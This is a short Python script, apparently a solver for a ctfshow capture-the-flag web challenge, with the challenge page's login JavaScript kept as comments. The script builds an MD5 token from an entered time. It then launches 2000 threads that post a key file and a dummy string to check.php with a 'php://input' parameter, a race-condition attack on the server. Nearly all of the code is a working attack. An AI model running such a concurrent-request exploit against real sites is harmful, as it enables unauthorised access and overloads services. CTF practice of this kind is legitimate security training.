import requests,threading,hashlib
minute=hashlib.md5(input("输入时分").encode()).hexdigest()
# MD5只会对字节类型进行加密,encode会把输入的字符串转换成字节类型
url=input("输入网址")+"/check.php?token="+minute+"&php://input"
with open("C:\\Users\\whb\\Downloads\\key (1).dat","rb")as f:
    data1=f.read()
    data2="mmmmmmm"
def func(data):
    reponse=requests.post(url=url,data=data,verify=False)
    with lock:
        print(reponse.text+"\n")
thred=[]
for i in range(1000):
    thred.append(threading.Thread(target=func,args=(data1,)))
    thred.append(threading.Thread(target=func,args=(data2,)))
lock=threading.Lock()
for i in range(2000): thred[i].start()
# <script>
	# 	function login(s){  
	# 	var u=document.getElementById("username").value;
	# 	var p=document.getElementById("password").value;
    #     var xhr = new XMLHttpRequest();  
    #     xhr.open('GET', "login.php?u="+u+"&p="+p);  
    #     xhr.responseType = 'arraybuffer';  
    #     xhr.onreadystatechange = function getPdfOnreadystatechange(e) {  
    #         if (xhr.readyState === 4) {  
    #           if (xhr.status === 200) {  
    #              var data = (xhr.mozResponseArrayBuffer || xhr.mozResponse ||  
    #                         xhr.responseArrayBuffer || xhr.response);   
	# 			if(data){
	# 				ctfshow(s,data);
	# 			}
    #           } 
    #         }  
    #     };  
    #     xhr.send(null);  
	# 	}  
	# 	function ctfshow(token,data){

	# 		var oReq = new XMLHttpRequest();
	# 		oReq.open("POST", "check.php?token="+token+"&php://input", true);
	# 		oReq.onload = function (oEvent) {
	# 			if(oReq.status===200){
	# 					var res=eval("("+oReq.response+")");
	# 					if(res.success ==1 &&res.error!=1){
	# 						alert(res.msg);
	# 						return;
	# 					}
	# 					if(res.error ==1){
	# 						alert(res.errormsg);
	# 						return;
	# 					}
	# 			}
	# 			return;
	# 		};
	# 		oReq.send(data);
	# 	}
	# </script>
    